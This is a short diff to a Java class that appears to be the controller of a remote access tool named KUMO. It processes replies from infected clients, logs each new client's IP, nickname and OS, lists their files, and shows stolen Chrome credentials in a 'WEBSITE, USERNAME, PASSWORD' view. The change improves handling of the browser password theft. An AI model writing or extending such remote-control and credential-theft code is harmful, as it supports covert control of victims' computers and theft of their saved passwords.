@@ -40,12 +40,16 @@ class ProcessCommands implements Repository {
                 SendCommandView.getConsole().appendText(sb.toString());
                 /* Sends back the System OS to KUMO */
             } else if (input.contains("SYS")) {
-                // OS::uname
-                String[] split = readFromDis(dis).split("::");
+                // OS::domain\\uname
+                String raw = readFromDis(dis);
+                Logger.log(Level.INFO, "Raw SYS command return: " + raw);
+                String[] split = raw.split("::");
                 String SYSTEMOS = split[0];
                 String uname = split[1];
                 client.setSYSTEM_OS(SYSTEMOS);
                 client.setUname(uname);
+                Logger.log(Level.INFO, "New client! " + client.getIP() + " :: " + client.getNickName() + " :: " + client.getSYSTEM_OS());
+
                 /* Goes up a directory in the file explorer (returns files) */
             } else if (input.contains("DIRECTORYUP")) {
                 client.clientCommunicate("FILELIST");
@@ -67,9 +71,11 @@ class ProcessCommands implements Repository {
                 ChromePassView.getResultsArea().appendText("WEBSITE, USERNAME, PASSWORD\n\n");
                 while (true) {
                     String content = readFromDis(dis);
-                    if (content == null || content.equals(null)) {
-                        continue;
+                    if (content.contains("Cannot parse Data files while chrome is running")){
+                        ChromePassView.getResultsArea().appendText(content);
+                        break;
                     }
+
                     if (content.trim().equals("ENDPSH")) {
                         break;
                     }
